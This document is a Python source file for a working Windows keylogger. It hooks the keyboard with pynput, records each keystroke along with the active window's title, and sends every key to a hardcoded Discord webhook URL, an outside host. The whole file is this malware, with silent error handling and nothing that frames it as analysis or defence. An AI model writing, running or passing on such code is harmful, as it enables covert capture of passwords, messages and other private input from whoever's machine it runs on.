import ctypes
import requests
from pynput import keyboard

# === CONFIG ===
WEBHOOK = "https://discord.com/api/webhooks/1396489430990196866/m0ocO7FF7aqQJc8sRCfJcPaFcQCXDmrrpFi3CTmAv76OqxaBf4o1oO3sKrbYCOO-eW0S"

# === STATE ===
shift_pressed = False
caps_on = False

def get_app_name():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value.split(' - ')[-1][:20] or "Unknown"
    except:
        return "Unknown"

def send_key(key, app):
    try:
        requests.post(WEBHOOK, json={"content": f"{key} | {app}"}, timeout=1)
    except:
        pass

def on_press(key):
    global shift_pressed, caps_on

    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = True
        return
    elif key == keyboard.Key.caps_lock:
        caps_on = not caps_on
        return

    app = get_app_name()

    try:
        char = key.char
        if char:
            if (shift_pressed or caps_on) and char.isalpha():
                char = char.upper()
            send_key(char, app)
    except:
        special_keys = {
            keyboard.Key.space: "SPACE",
            keyboard.Key.enter: "ENTER",
            keyboard.Key.tab: "TAB",
            keyboard.Key.backspace: "BACKSPACE"
        }
        send_key(special_keys.get(key, str(key)), app)

def on_release(key):
    global shift_pressed
    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
